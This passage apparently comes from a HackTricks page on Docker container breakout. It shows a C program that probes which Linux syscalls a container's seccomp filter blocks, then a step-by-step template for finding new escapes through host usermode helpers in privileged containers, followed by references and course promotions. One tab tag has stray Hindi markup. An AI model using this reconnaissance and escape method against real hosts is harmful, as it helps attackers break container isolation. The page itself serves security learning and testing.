0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{% endtab %}

{% टैब शीर्षक="syscall_bf.c" %}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````
{% endtab %}
{% endtabs %}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

* Find the **path of the containers filesystem** inside the host
* You can do this via **mount**, or via **brute-force PIDs** as explained in the second release\_agent exploit
* Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
* You should be able to **execute the trigger from inside the host**
* You need to know where the containers files are located inside the host to indicate a script you write inside the host
* Have **enough capabilities and disabled protections** to be able to abuse that functionality
* You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

* [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB)
* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=docker-breakout-privilege-escalation) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=docker-breakout-privilege-escalation" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
